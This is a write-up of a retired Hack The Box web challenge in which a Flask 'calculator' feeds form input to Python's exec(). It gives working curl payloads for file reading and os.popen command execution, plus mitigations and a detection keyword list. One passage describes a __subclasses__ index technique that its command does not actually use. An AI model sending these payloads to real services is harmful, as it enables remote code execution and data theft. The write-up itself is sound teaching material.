---
challenge: baby interdimensional internet
type: Web
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [web, python, flask, exec, sandbox-escape, rce]
---

# baby interdimensional internet — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Retired. Challenge solved; no real flags.

## TL;DR

A Flask calculator builds `recipe = "<ingredient> = <measurements>"` and feeds it to `exec()` with its own dictionary as *globals*; then it renders the resulting value. There are no filters or limits: the `measurements` field is arbitrary Python and the expression only has to return the contents of `flag`. It is `exec` on user input, not a jail.

## Brief and surface

- Web, Easy, retired.
- Only a Docker instance is provided (`IP:port`); no downloadable ZIP.
- The description jokes about a calculator ("where is a calculator when you need one").

```text
http://<IP>:<PORT>/          -> random operation like "a = 12+34"
http://<IP>:<PORT>/debug     -> application source code
```

## Recon

```bash
curl -s http://<IP>:<PORT>/
curl -s http://<IP>:<PORT>/debug | head -60
```

The page returns an already-solved sum: the server evaluates the expression, the browser does not compute it. `/debug` confirms the engine and the parameters.

## Source analysis

```python
def calc(recipe):
    global garage
    garage = {}
    try:
        exec(recipe, garage)
    except:
        pass

if request.method == 'POST':
    ingredient = request.form.get('ingredient', '')
    recipe = '%s = %s' % (ingredient, request.form.get('measurements', ''))
    calc(recipe)
    if garage.get(ingredient, ''):
        return render_template('index.html', calculations=garage[ingredient])
```

Three direct consequences:

- The `exec` is **Python 2** (`from string import lowercase` in the source): `exec` is a statement and `garage` acts as the global namespace.
- The assignment forces `measurements` to be an **expression**: `flag = open('flag').read()` works; `import os` would not fit inside an assignment.
- The result is rendered if truthy, so the value must be a non-empty string.

## The bug

`exec` is not an expression evaluator: it runs statements with all builtins available. Any file-reading or system function is within reach because `__builtins__` is not restricted, there is no blacklist and no type check.

This is not a *sandbox escape*: there is no sandbox. The bigger challenge in the family (Interdimensional Internet) does add a WAF; this one does not.

## Local reproduction

```bash
python2 -c 'exec("x = 1+1", {})'
```

With the app's own pattern:

```python
recipe = "a = open('flag').read()"
g = {}
exec(recipe, g)
print(g['a'])
```

## Exploitation

Direct flag read:

```bash
curl -s http://<IP>:<PORT> -d "ingredient=asdf&measurements=open('flag').read()" | grep -o 'HTB{[^}]*}'
```

Recon and command execution:

```bash
curl -s http://<IP>:<PORT> -d 'ingredient=v&measurements=__import__("os").popen("ls -la").read()'
curl -s http://<IP>:<PORT> -d 'ingredient=v&measurements=__import__("os").popen("cat flag").read()'
```

Classic subclass-escape variant (useful when `open` is unavailable):

```bash
# equivalent variant, without relying on the __subclasses__ index
curl -s http://<IP>:<PORT> -d "ingredient=v&measurements=open(chr(102)+chr(108)+chr(97)+chr(103)).read()"
```

Index `40` is the `file` object for that exact interpreter; if the version changes, find it by listing `__subclasses__()`.

## Evidence

- Trimmed `ls` and `cat flag` output.
- No real flags: values live in `private/`.

## Lessons learned

- `exec` on user input is RCE even when the variable is called "recipe" and the form looks like a calculator.
- In Python 2, `exec` as a statement takes a globals dictionary; the assignment result can be read from it.
- `try/except: pass` silences errors but does not prevent execution: the code already ran.
- For HTTP exfiltration the expression only has to return a string; no reverse shell needed.

## Mitigations and detection

- Never `exec`/`eval` user input. For a calculator, use a restricted AST parser (`ast.literal_eval` or a maths expression library).
- If evaluation is unavoidable, run it in an isolated process with no filesystem or network access and time limits.
- Detection: POST bodies containing `__import__`, `open(`, `subclasses` or `os.`; web-server processes opening files outside their directory.

MITRE: T1190 (exploit public-facing application), T1059.006 (Python), T1005 (data from local system).

## References

- <https://7rocky.github.io/en/ctf/htb-challenges/web/baby-interdimensional-internet>
- <https://s-3ntinel.github.io/hackthebox/challenges/web/baby_interdimensional_internet/baby_interdimensional_internet.html>
- <https://medium.com/@i.am.spotted84/baby-interdimensional-internet-984ed38a24d3>
- <https://docs.python.org/2/reference/simple_stmts.html#the-exec-statement>
